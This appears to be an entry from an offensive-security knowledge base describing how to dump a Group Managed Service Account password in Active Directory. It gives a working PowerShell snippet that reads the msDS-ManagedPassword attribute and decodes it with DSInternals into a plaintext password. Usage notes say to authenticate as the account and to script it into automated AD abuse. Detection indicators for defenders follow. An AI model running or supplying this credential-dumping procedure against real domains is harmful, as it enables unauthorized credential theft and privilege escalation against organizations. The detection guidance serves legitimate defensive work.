---
id: 1f12e2e6-115f-469c-8d11-e7dbe5738cdb
name: Retrieve-GMSA-Password-Using-DSInternals
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:06.961679+00:00'
updated_at: '2023-04-10T20:26:00.825161+00:00'
platforms:
  - Windows
  - Active Directory
tags:
  - gmsa
  - credential-access
  - active-directory
validated: true
---

# Retrieve-GMSA-Password-Using-DSInternals

## Code

```powershell
# Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'SQL_HQ_Primary' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

# Decode the data structure using the DSInternals module
ConvertFrom-ADManagedPasswordBlob $mp
```

## Description

This PowerShell code retrieves the msDS-ManagedPassword attribute from a specified Group Managed Service Account (GMSA) using the ActiveDirectory module and decodes the encrypted blob to expose the current plaintext password along with metadata like iteration count. It is used in scenarios where an attacker has domain credentials with read access to the GMSA object, allowing credential dumping for privilege escalation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'SQL_HQ_Primary' | Name of the target GMSA account | 'SQL_HQ_Primary' |

## Usage

Execute this code on a domain-joined Windows host with the ActiveDirectory and DSInternals modules imported. It assumes the user context has permissions to read the msDS-ManagedPassword property. The output password can be used directly for authentication as the GMSA on target services. Integrate into larger scripts for automated AD abuse after ACL enumeration.

## Detection

- Enable PowerShell ScriptBlock and Module logging to capture Get-ADServiceAccount and ConvertFrom-ADManagedPasswordBlob invocations.
- Monitor AD audit logs for attribute reads on GMSA objects by unauthorized users.
- Network indicators: LDAP queries for msDS-ManagedPassword from unexpected hosts.
- Process tree: powershell.exe querying AD without typical admin context.

## Related

- [[procedures/Abuse-AD-ACLs-ACEs-to-Retrieve-GMSA-Password]]
- [[tools/DSInternals]]
